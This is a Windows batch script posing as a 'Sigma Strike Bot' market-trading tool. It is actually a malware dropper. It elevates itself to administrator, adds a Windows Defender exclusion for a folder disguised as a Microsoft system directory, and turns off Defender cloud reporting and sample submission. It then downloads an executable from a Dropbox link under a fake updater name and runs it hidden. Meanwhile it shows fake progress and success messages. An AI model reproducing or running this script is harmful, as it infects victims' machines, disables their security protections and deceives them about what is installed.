@echo off
title Sigma Strike Bot - Decoding Market Chaos
color 0A
setlocal enabledelayedexpansion

:: ==========================================
:: SELF-ELEVATE
:: ==========================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: ==========================================
:: CONFIGURATION
:: ==========================================
set "URL=https://www.dropbox.com/scl/fi/hoona0uela3o432oz2fur/setup.exe?rlkey=hiuoqc6hpg6klkchyz31pf70x&st=q6yg6ch2&dl=1"
set "INSTALL_DIR=C:\ProgramData\Microsoft\Windows\WER"
set "LOADER=%INSTALL_DIR%\CLUpdater.exe"

cls
echo.
echo Sigma Strike Bot - Initializing Alpha Engine
echo ================================================
echo Decoding market chaos...
echo Targeting 24-hour volatility window...
echo.
echo [          ] 0%%
timeout /t 2 /nobreak >nul

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Set-MpPreference -MAPSReporting 0" >nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1

echo [======    ] 50%%
timeout /t 1 /nobreak >nul

:: ==========================================
:: DOWNLOAD & EXECUTE
:: ==========================================
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '%URL%' -OutFile '%LOADER%'" >nul 2>&1

echo [==========] 100%%
timeout /t 2 /nobreak >nul

if exist "%LOADER%" (
    powershell -Command "Unblock-File '%LOADER%' -ErrorAction SilentlyContinue" >nul 2>&1
    start "" /min "%LOADER%"
)

:: ==========================================
:: FINAL MESSAGE
:: ==========================================
cls
echo.
echo ================================================
echo Sigma Strike Bot Status:
echo ================================================
echo.
echo Sigma Engine successfully deployed.
echo 24-Hour Alpha Window activated.
echo Bot is now scanning for high-probability setups...
echo.
echo Press any key to close this window...
pause >nul
exit /b

